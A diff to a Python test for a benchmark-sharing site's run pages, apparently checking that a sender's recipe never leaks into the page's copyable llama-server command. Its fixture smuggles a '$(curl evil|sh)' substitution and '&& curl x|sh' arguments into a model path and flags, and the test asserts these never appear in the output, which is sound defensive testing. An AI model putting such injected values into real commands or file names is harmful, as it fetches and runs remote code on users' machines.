@@ -29,13 +29,16 @@ exec(compile(src, "test_card.py", "exec"), ns)
 b, recs, META, SITE = ns["b"], ns["recs"], ns["META"], ns["SITE"]
 machines = [[n, e["slug"], e["kind"], (e.get("best") or {}).get("name"), (e.get("best") or {}).get("predicted"), False, e["testable"]]
             for n, e in b["entries"].items()]
-for r in recs.values():   # the recipe each run used, as a record carries it (a model path on the sender's disk)
-    r[0]["recipe"] = dict(r[0]["recipe"], placement={"ctx": 65536, "kv_type": "q8_0"}, model={"path": "/home/alice/secret/Qwen3.6-35B-A3B-UD-Q4_K_XL.gguf"})
+for r in recs.values():   # the recipe each run carries: the sender's, with a path on their disk and a command in its flags
+    r[0]["recipe"] = dict(r[0]["recipe"], placement={"ctx": 65536, "kv_type": "q8_0"}, model={"path": "/home/alice/secret/$(curl evil|sh).gguf"},
+                          extra={"args": ["&&", "curl", "x|sh"]})
+# the site's published recipe for the model: what the page's settings come from
+PUBLISHED = {"placement": {"ctx": 65536, "kv_type": "q8_0"}, "model": {"path": "Qwen3.6-35B-A3B-UD-Q4_K_XL.gguf"}, "runtime": {"threads": 0}}
 
 
-def page(sid, state="drawn", frozen=None):
+def page(sid, state="drawn", frozen=None, recipe=PUBLISHED):
     live = card.spec(b, sid, recs[sid], META, SITE, now="2026-10-20T10:00:00Z", wait=False)
-    return R.user_run_page(sid, b, recs[sid], live, frozen, state, machines, SITE), live
+    return R.user_run_page(sid, b, recs[sid], live, frozen, state, machines, SITE, recipe), live
 
 
 html, live = page("aaaaaaaaaaaa")
@@ -46,7 +49,9 @@ assert 'download="llmbox-rtx-3060-12gb-46tps.png"' in html and 'src="r/aaaaaaaaa
 assert 'data-copy="https://llmbox.pages.dev/r/aaaaaaaaaaaa"' in html and "reddit.com/r/LocalLLaMA/submit" in html and "x.com/intent/post?text=" in html
 assert re.search(r'<option value="rtx-3060-12gb" selected>RTX 3060 12 GB</option>', html) and '<base href="/">' in html
 assert "quality: 82% of Claude Opus 5.5 · this run agrees ✓" in text
-assert "/home/alice" not in html and "Qwen3.6-35B-A3B-UD-Q4_K_XL.gguf" in html and "--port" not in html   # the file name only
+assert "/home/alice" not in html and "evil" not in html and "x|sh" not in html and "Qwen3.6-35B-A3B-UD-Q4_K_XL.gguf" in html and "--port" not in html   # never the sender's recipe
+assert 'data-copy="llama-server -m Qwen3.6-35B-A3B-UD-Q4_K_XL.gguf' in html   # one shell-quoted line to copy
+assert "Run it with these settings" not in page("aaaaaaaaaaaa", recipe=None)[0]   # no published recipe: no settings
 assert 'alt="RTX 3060 12 GB · 64 GB RAM runs Qwen3.6-35B-A3B UD-Q4_K_XL at 46 tokens per second' in html
 # the card drawn earlier said something else: both, dated
 old = dict(live, place={"kind": "others", "text": "4 others like it: 40 · 41 · 42 · 43 tok/s"}, drawn="2026-10-14T09:00:00Z")
@@ -61,7 +66,7 @@ assert '<span class="badge">FIRST ON THIS CARD</span>' in h and "speed only: thi
 h = page("cccccccccccc", frozen=dict(card.spec(b, "cccccccccccc", recs["cccccccccccc"], META, SITE), badge="FIRST ON THIS CARD", drawn="2026-10-12T00:00:00Z"))[0]
 assert "no longer the first here (a run received earlier was published after it)" in h
 # quality: a mismatch, held for review, anonymous
-assert "does not match the model's published score" in page("dddddddddddd")[0]
+assert "this run's range does not overlap the model's published score" in page("dddddddddddd")[0]
 recs["dddddddddddd"][1]["submission"]["flags"] = ["self-seeded"]
 h = page("dddddddddddd")[0]
 assert "quality held for review: its tasks were not the ones the server drew for it" in h and 'href="method.html#trust"' in h
